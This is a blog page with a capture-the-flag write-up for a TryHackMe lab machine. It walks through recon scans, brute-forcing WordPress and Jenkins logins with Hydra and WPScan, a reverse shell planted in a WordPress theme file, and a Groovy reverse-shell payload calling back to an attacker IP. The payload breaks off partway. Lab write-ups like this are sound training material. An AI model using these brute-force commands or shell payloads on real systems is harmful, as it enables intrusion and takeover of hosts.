@@ -1,0 +1,622 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+      <title>
+        Internal - Write Up ::
+        Lanfran02 - Blog — Where write-ups are made.
+      </title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta
+  name="description"
+  content="Link Level Creator     Here Medium user    Reconn ╰─ lanfran@parrot ❯ map 10.10.170.6 ─╯ [sudo] password for lanfran: Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-09 10:53 CEST Nmap scan report for 10.10.170.6 Host is up (0.082s latency). Not shown: 990 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA) | 256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA) |_ 256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (ED25519) 80/tcp open http Apache httpd 2."
+/>
+<meta
+  name="keywords"
+  content="CTF, Writeup, Hacking"
+/>
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="/posts/internal/" />
+
+
+
+
+
+<link rel="stylesheet" href="/assets/style.css" />
+
+<link rel="stylesheet" href="/style.css" />
+
+
+<link
+  rel="apple-touch-icon-precomposed"
+  sizes="144x144"
+  href="/img/apple-touch-icon-144-precomposed.png"
+/>
+<link rel="shortcut icon" href="/img/favicon.png" />
+
+
+<link href="/assets/fonts/Inter-Italic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/assets/fonts/Inter-Regular.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/assets/fonts/Inter-Medium.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/assets/fonts/Inter-MediumItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/assets/fonts/Inter-Bold.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/assets/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Internal - Write Up"/>
+<meta name="twitter:description" content="TryHackMe&#39;s medium level machine."/>
+
+
+
+<meta property="og:title" content="Internal - Write Up" />
+<meta property="og:description" content="TryHackMe&#39;s medium level machine." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/posts/internal/" />
+<meta property="article:published_time" content="2021-07-09T10:52:31+02:00" />
+<meta property="article:modified_time" content="2021-07-09T10:52:31+02:00" /><meta property="og:site_name" content="Lanfran02 - Blog" />
+
+
+
+ 
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'G-3T7DYCWC0W', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+ 
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'G-3T7DYCWC0W', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+
+  </head>
+  <body class="dark-theme">
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a
+  href="/"
+  class="logo"
+  style="text-decoration: none;"
+>
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
+</svg>
+</span>
+    <span class="logo__text"
+      >Lanfran02</span
+    >
+    <span class="logo__cursor"></span>
+  
+</a>
+
+    <span class="header__right">
+      
+        <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="/es/">Español</a></li>
+        
+      
+      
+        <ul class="menu__sub-inner">
+          <li class="menu__sub-inner-more-trigger">
+            Write Ups
+            <span class="menu__sub-inner-more-trigger-icon"
+              ><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
+</svg>
+</span
+            >
+          </li>
+          <ul class="menu__sub-inner-more hidden">
+            
+              
+                <li><a href="/tags/hackthebox/">HTB</a></li>
+              
+            
+              
+                <li><a href="/tags/tryhackme/">THM</a></li>
+              
+            
+          </ul>
+        </ul>
+      
+      
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+      
+        <li><a href="/es/">Español</a></li>
+      
+    
+      
+        <li><a href="/tags/hackthebox/">HTB</a></li>
+      
+    
+      
+        <li><a href="/tags/tryhackme/">THM</a></li>
+      
+    
+  </ul>
+</nav>
+
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none" />
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z" />
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg
+  class="theme-toggler"
+  width="24"
+  height="24"
+  viewBox="0 0 48 48"
+  fill="none"
+  xmlns="http://www.w3.org/2000/svg"
+>
+  <path
+    d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"
+  />
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+
+      <div class="content">
+        
+  
+  
+
+  <div class="post">
+    <h1 class="post-title">Internal - Write Up</h1>
+    <div class="post-meta">
+      
+        <span class="post-date">
+          2021-07-09
+        </span>
+
+        
+          
+        
+      
+
+      
+        <span class="post-author"
+          >— Written by Lanfran02</span
+        >
+
+
+      
+        <span class="post-read-time"
+          >— 7 min read</span
+        >
+      
+    </div>
+
+    
+      <span class="post-tags">
+        
+          <a href="/tags/tryhackme/">#TryHackMe</a>&nbsp;
+        
+      </span>
+    
+
+    
+      <figure class="post-cover">
+        
+          <img src="/posts/internal/cover.jpeg" alt="Internal - Write Up" />
+        
+
+        
+      </figure>
+    
+
+    <div class="post-content">
+      
+        
+        <h2>Table of Contents</h2>
+        <aside class="table-of-contents"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#reconn">Reconn</a></li>
+    <li><a href="#foothold---user">Foothold - User</a></li>
+    <li><a href="#root">Root</a></li>
+  </ul>
+</nav></aside>
+        
+      
+      <table>
+<thead>
+<tr>
+<th>Link</th>
+<th>Level</th>
+<th>Creator</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a href="https://tryhackme.com/room/">Here</a></td>
+<td>Medium</td>
+<td><a href="https://tryhackme.com/p/">user</a></td>
+</tr>
+</tbody>
+</table>
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<h2 id="reconn">Reconn</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">╰─ lanfran@parrot ❯ map 10.10.170.6                                                                                                ─╯
+<span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> lanfran: 
+Starting Nmap 7.91 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2021-07-09 10:53 CEST
+Nmap scan report <span style="color:#66d9ef">for</span> 10.10.170.6
+Host is up <span style="color:#f92672">(</span>0.082s latency<span style="color:#f92672">)</span>.
+Not shown: <span style="color:#ae81ff">990</span> closed ports
+PORT     STATE    SERVICE      VERSION
+22/tcp   open     ssh          OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+| ssh-hostkey: 
+|   <span style="color:#ae81ff">2048</span> 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+|   <span style="color:#ae81ff">256</span> ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+|_  <span style="color:#ae81ff">256</span> b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+80/tcp   open     http         Apache httpd 2.4.29 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
+|_http-server-header: Apache/2.4.29 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+|_http-title: Apache2 Ubuntu Default Page: It works
+1002/tcp filtered windows-icfw
+1132/tcp filtered kvm-via-ip
+1935/tcp filtered rtmp
+2007/tcp filtered dectalk
+2048/tcp filtered dls-monitor
+2366/tcp filtered qip-login
+6006/tcp filtered X11:6
+8800/tcp filtered sunwebadmin
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 34.25 seconds
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">╰─ lanfran@parrot ❯ scan 10.10.170.6                                                                                               ─╯
+<span style="color:#f92672">===============================================================</span>
+Gobuster v3.0.1
+by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@_FireFart_<span style="color:#f92672">)</span>
+<span style="color:#f92672">===============================================================</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:            http://10.10.170.6
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:        <span style="color:#ae81ff">50</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:       /usr/share/wordlists/dirb/common.txt
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Status codes:   200,204,301,302,307,401,403
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:     gobuster/3.0.1
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:        10s
+<span style="color:#f92672">===============================================================</span>
+2021/07/09 10:53:31 Starting gobuster
+<span style="color:#f92672">===============================================================</span>
+/.htaccess <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
+/blog <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span>
+/.hta <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
+/.htpasswd <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
+/index.html <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span>
+/javascript <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span>
+/phpmyadmin <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span>
+/server-status <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
+/wordpress <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span>
+<span style="color:#f92672">===============================================================</span>
+2021/07/09 10:53:40 Finished
+<span style="color:#f92672">===============================================================</span>
+</code></pre></div><p><code>href=&quot;http://internal.thm/blog/index.php/feed/&quot; /&gt;</code></p>
+<p>let&rsquo;s add the new domain to <code>/etc/hosts</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">╰─ lanfran@parrot ❯ wpscan -e vp,vt,cb,u --url http://internal.thm/blog/                                                           ─╯
+_______________________________________________________________
+         __          _______   _____
+         <span style="color:#ae81ff">\ \ </span>       / /  __ <span style="color:#ae81ff">\ </span>/ ____|
+          <span style="color:#ae81ff">\ \ </span> /<span style="color:#ae81ff">\ </span> / /| |__<span style="color:#f92672">)</span> | <span style="color:#f92672">(</span>___   ___  __ _ _ __ ®
+           <span style="color:#ae81ff">\ \/</span>  <span style="color:#ae81ff">\/</span> / |  ___/ <span style="color:#ae81ff">\_</span>__ <span style="color:#ae81ff">\ </span>/ __|/ _<span style="color:#e6db74">`</span> | <span style="color:#960050;background-color:#1e0010">&#39;</span>_ <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>            <span style="color:#ae81ff">\ </span> /<span style="color:#ae81ff">\ </span> /  | |     ____<span style="color:#f92672">)</span> | <span style="color:#f92672">(</span>__| <span style="color:#f92672">(</span>_| | | | |
+             <span style="color:#ae81ff">\/</span>  <span style="color:#ae81ff">\/</span>   |_|    |_____/ <span style="color:#ae81ff">\_</span>__|<span style="color:#ae81ff">\_</span>_,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.17
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+<span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
+
+<span style="color:#f92672">[</span>i<span style="color:#f92672">]</span> User<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> Identified:
+
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> admin
+ | Found By: Author Posts - Author Pattern <span style="color:#f92672">(</span>Passive Detection<span style="color:#f92672">)</span>
+ | Confirmed By:
+ |  Rss Generator <span style="color:#f92672">(</span>Passive Detection<span style="color:#f92672">)</span>
+ |  Wp Json Api <span style="color:#f92672">(</span>Aggressive Detection<span style="color:#f92672">)</span>
+ |   - http://internal.thm/blog/index.php/wp-json/wp/v2/users/?per_page<span style="color:#f92672">=</span>100&amp;page<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
+ |  Author Id Brute Forcing - Author Pattern <span style="color:#f92672">(</span>Aggressive Detection<span style="color:#f92672">)</span>
+ |  Login Error Messages <span style="color:#f92672">(</span>Aggressive Detection<span style="color:#f92672">)</span>
+
+<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> No WPScan API Token given, as a result vulnerability data has not been output.
+<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> You can get a free API token with <span style="color:#ae81ff">25</span> daily requests by registering at https://wpscan.com/register
+
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Finished: Fri Jul  <span style="color:#ae81ff">9</span> 10:58:59 <span style="color:#ae81ff">2021</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Requests Done: <span style="color:#ae81ff">538</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Cached Requests: <span style="color:#ae81ff">9</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Data Sent: 142.935 KB
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Data Received: 538.97 KB
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Memory used: 219.34 MB
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Elapsed time: 00:00:18
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">╰─ lanfran@parrot ❯ wpscan --url http://internal.thm/blog -U admin -P /usr/share/wordlists/rockyou.txt                             ─╯
+_______________________________________________________________
+         __          _______   _____
+         <span style="color:#ae81ff">\ \ </span>       / /  __ <span style="color:#ae81ff">\ </span>/ ____|
+          <span style="color:#ae81ff">\ \ </span> /<span style="color:#ae81ff">\ </span> / /| |__<span style="color:#f92672">)</span> | <span style="color:#f92672">(</span>___   ___  __ _ _ __ ®
+           <span style="color:#ae81ff">\ \/</span>  <span style="color:#ae81ff">\/</span> / |  ___/ <span style="color:#ae81ff">\_</span>__ <span style="color:#ae81ff">\ </span>/ __|/ _<span style="color:#e6db74">`</span> | <span style="color:#960050;background-color:#1e0010">&#39;</span>_ <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>            <span style="color:#ae81ff">\ </span> /<span style="color:#ae81ff">\ </span> /  | |     ____<span style="color:#f92672">)</span> | <span style="color:#f92672">(</span>__| <span style="color:#f92672">(</span>_| | | | |
+             <span style="color:#ae81ff">\/</span>  <span style="color:#ae81ff">\/</span>   |_|    |_____/ <span style="color:#ae81ff">\_</span>__|<span style="color:#ae81ff">\_</span>_,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.17
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+<span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
+
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Performing password attack on Xmlrpc against <span style="color:#ae81ff">1</span> user/s
+<span style="color:#f92672">[</span>SUCCESS<span style="color:#f92672">]</span> - admin / <span style="color:#f92672">[</span>REDACTED<span style="color:#f92672">]</span>                                                                                                           
+Trying admin / bratz1 Time: 00:02:40 &lt;                                                       &gt; <span style="color:#f92672">(</span><span style="color:#ae81ff">3885</span> / 14348277<span style="color:#f92672">)</span>  0.02%  ETA: ??:??:??
+
+<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Valid Combinations Found:
+ | Username: admin, Password: <span style="color:#f92672">[</span>REDACTED<span style="color:#f92672">]</span>
+
+<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> No WPScan API Token given, as a result vulnerability data has not been output.
+<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> You can get a free API token with <span style="color:#ae81ff">25</span> daily requests by registering at https://wpscan.com/register
+
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Finished: Fri Jul  <span style="color:#ae81ff">9</span> 11:07:29 <span style="color:#ae81ff">2021</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Requests Done: <span style="color:#ae81ff">4026</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Cached Requests: <span style="color:#ae81ff">37</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Data Sent: 2.036 MB
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Data Received: 2.31 MB
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Memory used: 237.906 MB
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Elapsed time: 00:02:51
+</code></pre></div><p>Wp Admin password found.</p>
+<h2 id="foothold---user">Foothold - User</h2>
+<p>Login in to WP-Admin we get our rev shell using the 404.php template.</p>
+<p><code>http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php</code></p>
+<p>We uploaded our shell there.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">╰─ lanfran@parrot ❯ nc -nlvp <span style="color:#ae81ff">1337</span>                                                                                                                                  ─╯
+listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">1337</span> ...
+connect to <span style="color:#f92672">[</span>10.9.1.222<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.170.6<span style="color:#f92672">]</span> <span style="color:#ae81ff">48948</span>
+bash: cannot set terminal process group <span style="color:#f92672">(</span>1075<span style="color:#f92672">)</span>: Inappropriate ioctl <span style="color:#66d9ef">for</span> device
+bash: no job control in this shell
+www-data@internal:/var/www/html/wordpress/wp-content/themes/twentyseventeen$ id
+uid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span>
+www-data@internal:/var/www/html/wordpress/wp-content/themes/twentyseventeen$ whoami
+www-data
+</code></pre></div><p>We found a file, saving the password and user of aubreanna</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@internal:/opt$ ls -la
+total <span style="color:#ae81ff">16</span>
+drwxr-xr-x  <span style="color:#ae81ff">3</span> root root <span style="color:#ae81ff">4096</span> Aug  <span style="color:#ae81ff">3</span>  <span style="color:#ae81ff">2020</span> .
+drwxr-xr-x <span style="color:#ae81ff">24</span> root root <span style="color:#ae81ff">4096</span> Aug  <span style="color:#ae81ff">3</span>  <span style="color:#ae81ff">2020</span> ..
+drwx--x--x  <span style="color:#ae81ff">4</span> root root <span style="color:#ae81ff">4096</span> Aug  <span style="color:#ae81ff">3</span>  <span style="color:#ae81ff">2020</span> containerd
+-rw-r--r--  <span style="color:#ae81ff">1</span> root root  <span style="color:#ae81ff">138</span> Aug  <span style="color:#ae81ff">3</span>  <span style="color:#ae81ff">2020</span> wp-save.txt
+www-data@internal:/opt$ cat wp-save.txt
+Bill,
+
+Aubreanna needed these credentials <span style="color:#66d9ef">for</span> something later.  Let her know you have them and where they are.
+
+aubreanna:<span style="color:#f92672">[</span>REDACTED<span style="color:#f92672">]</span>
+www-data@internal:/opt$ su aubreanna
+Password: <span style="color:#f92672">[</span>REDACTED<span style="color:#f92672">]</span>
+
+aubreanna@internal:/opt$ cat /home/aubreanna/user.txt 
+<span style="color:#f92672">[</span>REDACTED<span style="color:#f92672">]</span>
+</code></pre></div><h2 id="root">Root</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">aubreanna@internal:~$ cat jenkins.txt 
+Internal Jenkins service is running on 172.17.0.2:8080
+aubreanna@internal:~$
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">╰─ lanfran@parrot ❯ ssh -L 8080:172.17.0.2:8080 aubreanna@internal.thm                                                             ─╯
+The authenticity of host <span style="color:#e6db74">&#39;internal.thm (10.10.170.6)&#39;</span> can<span style="color:#e6db74">&#39;t be established.
+</span><span style="color:#e6db74">ECDSA key fingerprint is SHA256:fJ/BlTrDF8wS8/eqyoej1aq/NmvQh79ABdkpiiN5tqE.
+</span><span style="color:#e6db74">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+</span><span style="color:#e6db74">Warning: Permanently added &#39;</span>internal.thm,10.10.170.6<span style="color:#e6db74">&#39; (ECDSA) to the list of known hosts.
+</span><span style="color:#e6db74">aubreanna@internal.thm&#39;</span>s password: 
+Welcome to Ubuntu 18.04.4 LTS <span style="color:#f92672">(</span>GNU/Linux 4.15.0-112-generic x86_64<span style="color:#f92672">)</span>
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Fri Jul  <span style="color:#ae81ff">9</span> 09:24:06 UTC <span style="color:#ae81ff">2021</span>
+
+  System load:  0.02              Processes:              <span style="color:#ae81ff">117</span>
+  Usage of /:   63.9% of 8.79GB   Users logged in:        <span style="color:#ae81ff">0</span>
+  Memory usage: 48%               IP address <span style="color:#66d9ef">for</span> eth0:    10.10.170.6
+  Swap usage:   0%                IP address <span style="color:#66d9ef">for</span> docker0: 172.17.0.1
+
+  <span style="color:#f92672">=</span>&gt; There is <span style="color:#ae81ff">1</span> zombie process.
+
+
+ * Canonical Livepatch is available <span style="color:#66d9ef">for</span> installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+
+<span style="color:#ae81ff">0</span> packages can be updated.
+<span style="color:#ae81ff">0</span> updates are security updates.
+
+
+Last login: Mon Aug  <span style="color:#ae81ff">3</span> 19:56:19 <span style="color:#ae81ff">2020</span> from 10.6.2.56
+aubreanna@internal:~$
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">╰─ lanfran@parrot ❯ hydra 127.0.0.1 -s <span style="color:#ae81ff">8080</span> -f http-form-post <span style="color:#e6db74">&#34;/j_acegi_security_check:j_username=^USER^&amp;j_password=^PASS^&amp;from=%2F&amp;Submit=Sign+in&amp;Login=Login:Invalid username or password&#34;</span> -l admin -P /usr/share/wordlists/rockyou.txt 
+Hydra v9.1 <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2020</span> by van Hauser/THC &amp; David Maciejak - Please <span style="color:#66d9ef">do</span> not use in military or secret service organizations, or <span style="color:#66d9ef">for</span> illegal purposes <span style="color:#f92672">(</span>this is non-binding, these *** ignore laws and ethics anyway<span style="color:#f92672">)</span>.
+
+Hydra <span style="color:#f92672">(</span>https://github.com/vanhauser-thc/thc-hydra<span style="color:#f92672">)</span> starting at 2021-07-09 11:41:41
+<span style="color:#f92672">[</span>WARNING<span style="color:#f92672">]</span> Restorefile <span style="color:#f92672">(</span>you have <span style="color:#ae81ff">10</span> seconds to abort... <span style="color:#f92672">(</span>use option -I to skip waiting<span style="color:#f92672">))</span> from a previous session found, to prevent overwriting, ./hydra.restore
+<span style="color:#f92672">[</span>DATA<span style="color:#f92672">]</span> max <span style="color:#ae81ff">16</span> tasks per <span style="color:#ae81ff">1</span> server, overall <span style="color:#ae81ff">16</span> tasks, <span style="color:#ae81ff">14344399</span> login tries <span style="color:#f92672">(</span>l:1/p:14344399<span style="color:#f92672">)</span>, ~896525 tries per task
+<span style="color:#f92672">[</span>DATA<span style="color:#f92672">]</span> attacking http-post-form://127.0.0.1:8080/j_acegi_security_check:j_username<span style="color:#f92672">=</span>^USER^&amp;j_password<span style="color:#f92672">=</span>^PASS^&amp;from<span style="color:#f92672">=</span>%2F&amp;Submit<span style="color:#f92672">=</span>Sign+in&amp;Login<span style="color:#f92672">=</span>Login:Invalid username or password
+<span style="color:#f92672">[</span>8080<span style="color:#f92672">][</span>http-post-form<span style="color:#f92672">]</span> host: 127.0.0.1   login: admin   password: <span style="color:#f92672">[</span>REDACTED<span style="color:#f92672">]</span>
+<span style="color:#f92672">[</span>STATUS<span style="color:#f92672">]</span> attack finished <span style="color:#66d9ef">for</span> 127.0.0.1 <span style="color:#f92672">(</span>valid pair found<span style="color:#f92672">)</span>
+<span style="color:#ae81ff">1</span> of <span style="color:#ae81ff">1</span> target successfully completed, <span style="color:#ae81ff">1</span> valid password found
+Hydra <span style="color:#f92672">(</span>https://github.com/vanhauser-thc/thc-hydra<span style="color:#f92672">)</span> finished at 2021-07-09 11:42:07
+
+</code></pre></div><p><code>https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#groovy</code></p>
+<p>we get the reverse shell,</p>
+<p><code>http://127.0.0.1:8080/script</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">String host<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;10.9.1.222&#34;</span><span style="color:#f92672">;</span>
+<span style="color:#66d9ef">int</span> port<span style="color:#f92672">=</span>1337<span style="color:#f92672">;</span>
+String cmd<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/bin/bash&#34;</span><span style="color:#f92672">;</span>
+Process p<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> ProcessBuilder<span style="color:#f92672">(</span>cmd<span style="color:#f92672">).</span><span style="color:#a6e22e">redirectErrorStream</span><span style="color:#f92672">(</span><span style="color:#66d9ef">true</span><span style="color:#f92672">).</span><span style="color:#a6e22e">start</span><span style="color:#f92672">();</span>Socket s<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> Socket<span style="color:#f92672">(</span>host<span style="color:#f92672">,</span>port<span style="color:#f92672">);</span>InputStream pi<span style="color:#f92672">=</span>p<span style="color:#f92672">.</span><span style="color:#a6e22e">getInputStream</span><span style="color:#f92672">(),</span>pe<span style="color:#f92672">=</span>p<span style="color:#f92672">.</span><span style="color:#a6e22e">getErrorStream</span><span style="color:#f92672">(),</span> si<span style="color:#f92672">=</span>s<span style="color:#f92672">.</span><span style="color:#a6e22e">getInputStream</span><span style="color:#f92672">();</span>OutputStream po<span style="color:#f92672">=</span>p<span style="color:#f92672">.</span><span style="color:#a6e22e">getOutputStream</span><span style="color:#f92672">(),</span>so<span style="color:#f92672">=</span>s<span style="color:#f92672">.</span><span style="color:#a6e22e">getOutputStream</span><span style="color:#f92672">();</span><span style="color:#66d9ef">while</span><span style="color:#f92672">(!</span>s<span style="color:#f92672">.</span><span style="color:#a6e22e">isClosed</span><span style="color:#f92672">()){</span><span style="color:#66d9ef">while</span><span style="color:#f92672">(</span>pi<span style="color:#f92672">.</span><span style="color:#a6e22e">available</span><span style="color:#f92672">()&gt;</span>0<span style="color:#f92672">)</span>so<span style="color:#f92672">.</span><span 